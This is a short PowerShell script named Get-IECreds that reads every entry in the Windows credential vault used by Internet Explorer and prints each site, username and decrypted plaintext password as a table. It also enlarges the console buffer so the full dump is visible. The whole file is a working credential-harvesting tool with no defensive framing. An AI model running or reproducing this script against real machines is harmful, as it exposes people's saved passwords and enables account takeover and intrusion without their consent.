#
# Get-IECreds
#



function Get-IECreds() {
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ } |select Resource, UserName, Password | Sort-Object Resource  | ft -Autosize
}

#######################################

echo "##IE Creds"
echo "================================================="
echo ""

# Update output buffer size to 500
if( $Host -and $Host.UI -and $Host.UI.RawUI ) {
  $rawUI = $Host.UI.RawUI
  $oldSize = $rawUI.BufferSize
  $typeName = $oldSize.GetType( ).FullName
  $newSize = New-Object $typeName (500, $oldSize.Height)
  $rawUI.BufferSize = $newSize
}

Get-IECreds
echo "`n`n`n"

#######################################